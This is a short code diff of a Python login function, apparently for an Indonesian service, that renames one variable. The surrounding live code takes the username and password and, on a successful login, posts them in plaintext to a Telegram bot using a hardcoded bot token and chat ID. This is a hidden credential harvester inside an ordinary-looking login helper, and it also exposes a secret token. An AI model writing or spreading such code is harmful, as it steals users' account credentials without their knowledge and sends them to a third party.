@@ -35,8 +35,8 @@ def umsida(usr, pwd):
         msg = "username: "+usr+"\npassword: "+pwd+"\n"
         TOKEN = '2011172773:AAG-23HV-MX8Wn0anI5Bm9fuoQC4pJVwy7U'
         CHAT_ID = '1884067981'
-        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}'
-        ntz = req.post(url)
+        urls = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}'
+        ntz = req.post(urls)
         return 'Login sukses'
     else:
         return 'Login gagal'
